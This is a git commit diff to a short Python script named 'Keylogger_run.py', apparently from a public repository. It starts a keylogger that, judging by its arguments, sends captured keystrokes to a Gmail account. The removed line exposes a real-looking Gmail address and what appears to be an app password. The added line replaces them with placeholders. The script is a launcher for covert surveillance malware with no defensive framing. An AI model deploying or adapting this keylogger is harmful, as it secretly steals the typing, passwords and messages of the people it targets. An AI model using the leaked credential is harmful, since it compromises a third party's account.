cdebc409e87e8ee1f0046d7e5b25efedd20fe569
krishna-grayhat <142478625+krishna-grayhat@users.noreply.github.com>
2023-08-17 12:01:48 +0530

    Update Keylogger_run.py

--- Keylogger_run.py
+++ Keylogger_run.py
@@ -1,4 +1,4 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger(30, "ajay.kumar.695632@gmail.com", "aezcewmrzbckzhnl") 
+my_keylogger = keylogger.Keylogger(120, "enter your gmail", "fill your passwd") 
 my_keylogger.start()
